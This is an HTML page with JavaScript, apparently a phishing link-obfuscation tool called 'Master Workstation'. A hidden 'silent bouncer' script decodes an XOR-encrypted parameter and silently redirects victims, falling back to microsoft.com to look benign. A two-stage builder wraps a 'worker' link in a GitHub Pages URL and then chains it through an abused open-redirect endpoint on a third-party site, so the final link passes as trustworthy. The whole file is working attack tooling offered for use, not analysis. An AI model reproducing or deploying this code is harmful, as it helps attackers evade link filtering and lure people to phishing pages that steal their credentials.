<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Master Workstation</title>
    <script>
        // --- 1. SILENT BOUNCER (Victim Logic) ---
        const secretKey = "S3cur3_G4t3w4y";
        const params = new URLSearchParams(window.location.search);
        const payload = params.get('p');

        if (payload) {
            document.documentElement.style.display = 'none';
            try {
                const binary = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
                let destination = "";
                for (let i = 0; i < binary.length; i++) {
                    destination += String.fromCharCode(binary.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
                }
                window.location.replace(destination);
            } catch(e) {
                window.location.replace("https://www.microsoft.com");
            }
        }
    </script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; padding: 20px; }
        .container { max-width: 600px; margin: auto; }
        .card { background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155; margin-bottom: 20px; }
        h2 { color: #38bdf8; margin-top: 0; font-size: 18px; border-bottom: 1px solid #334155; padding-bottom: 10px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box; }
        button { background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; }
        .output { margin-top: 15px; padding: 10px; background: #020617; border: 1px dashed #38bdf8; font-family: monospace; font-size: 11px; word-break: break-all; color: #fbbf24; display: none; }
    </style>
</head>
<body>
<div class="container">

    <div class="card">
        <h2>Stage 2: Encrypt Worker Link</h2>
        <input type="text" id="workerLink" placeholder="Paste Stage 1 (Worker) Link here">
        <button onclick="makeStage2()">ENCRYPT & GET GITHUB LINK</button>
        <div id="stage2Output" class="output"></div>
    </div>

    <div class="card">
        <h2>Stage 3: Open Redirect Merger</h2>
        <p style="font-size:12px; color:#94a3b8;">Paste the Open Redirect base (e.g., https://site.com/logout?url=)</p>
        <input type="text" id="redirectBase" placeholder="https://aviation.minusma.unmissions.org/.../logout.aspx?returnUrl=">
        <p style="font-size:12px; color:#94a3b8;">Paste your Stage 2 (GitHub) Link from above:</p>
        <input type="text" id="githubLink" placeholder="https://dasmineencounterrealty.github.io/super-train/?p=...">
        <button onclick="mergeLinks()" style="background:#10b981;">GENERATE FINAL LINK</button>
        <div id="finalOutput" class="output"></div>
    </div>

</div>

<script>
    function makeStage2() {
        const input = document.getElementById('workerLink').value;
        if(!input) return;
        let result = "";
        for (let i = 0; i < input.length; i++) {
            result += String.fromCharCode(input.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
        }
        const encrypted = btoa(result).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        const finalUrl = window.location.origin + window.location.pathname + "?p=" + encrypted;
        const out = document.getElementById('stage2Output');
        out.innerText = finalUrl;
        out.style.display = 'block';
        document.getElementById('githubLink').value = finalUrl; // Auto-fill next step
    }

    function mergeLinks() {
        const base = document.getElementById('redirectBase').value;
        const github = document.getElementById('githubLink').value;
        if(!base || !github) return;

        // Encode the github link to mask the 'https://'
        const encodedGithub = encodeURIComponent(github);
        const final = base + encodedGithub;

        const out = document.getElementById('finalOutput');
        out.innerText = final;
        out.style.display = 'block';
    }
</script>
</body>
</html>
